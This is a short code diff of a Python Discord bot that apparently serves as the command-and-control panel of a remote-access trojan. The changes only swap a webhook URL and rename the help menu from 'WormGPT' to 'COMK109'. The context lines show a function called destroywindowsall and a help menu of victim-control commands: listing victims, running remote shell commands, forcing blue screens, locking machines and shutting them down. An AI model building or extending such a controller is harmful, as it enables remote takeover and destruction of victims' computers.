@@ -12,7 +12,7 @@ import random
 
 BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
 CHANNEL_ID = YOUR_CHANNEL_ID_HERE
-WEBHOOK_URL = "https://discord.com/api/webhooks/.....S"
+WEBHOOK_URL = "https://discord.com/api/webhooks/...."
 LOG_CHANNEL = YOUR_LOG_CHANNEL_ID_HERE
 
 bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
@@ -499,7 +499,7 @@ async def destroywindowsall(ctx):
 
 @bot.command()
 async def helpme(ctx):
-    embed = discord.Embed(title="WormGPT Commands v8.0", color=0xff0000)
+    embed = discord.Embed(title="COMK109 Commands v8.0", color=0xff0000)
     embed.add_field(name="AUTH", value="!login <pass>", inline=False)
     embed.add_field(name="STATUS", value="!status\n!victims\n!info <ip>\n!history", inline=False)
     embed.add_field(name="SYSTEM", value="!shell <ip> <cmd>\n!shutdown <ip>\n!restart <ip>\n!bsod <ip>\n!lock <ip>", inline=False)
